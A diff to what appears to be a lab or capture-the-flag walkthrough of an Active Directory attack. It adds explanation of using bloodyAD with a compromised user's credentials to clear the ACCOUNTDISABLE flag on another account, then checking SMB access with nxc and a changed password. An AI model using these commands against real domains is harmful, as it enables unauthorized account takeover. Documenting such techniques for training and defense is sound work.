@@ -837,7 +837,7 @@ SMB         10.1.140.119    445    DC-CC            [-] city.local\sam.brooks:0x
 
 *sam.brooks authentication rejected with STATUS_ACCOUNT_DISABLED after the password change*
 
-The password change worked, but `STATUS_ACCOUNT_DISABLED` means the account cannot authenticate at all. Full control also lets us write the account's attributes, so we clear the `ACCOUNTDISABLE` flag out of `userAccountControl`.
+The password change worked, but `STATUS_ACCOUNT_DISABLED` means the account cannot authenticate at all. Full control also lets us write the account's attributes, so we clear the `ACCOUNTDISABLE` flag out of `userAccountControl`. bloodyAD writes Active Directory object attributes from the command line, and `remove uac` clears the flag we name.
 
 ```
 bloodyad --host 10.1.140.119 -d city.local -u 'emma.hayes' -p '!Gemma4James!' remove uac 'sam.brooks' -f ACCOUNTDISABLE
@@ -850,6 +850,8 @@ bloodyad --host 10.1.140.119 -d city.local -u 'emma.hayes' -p '!Gemma4James!' re
 ![bloodyAD clearing the ACCOUNTDISABLE flag](images/bloodyad-enable.png)
 
 *bloodyAD removing ACCOUNTDISABLE from the sam.brooks userAccountControl value*
+
+We validate again.
 
 ```
 nxc smb 10.1.140.119 -u 'sam.brooks' -p '0xB1rdWasHere1337!' --shares
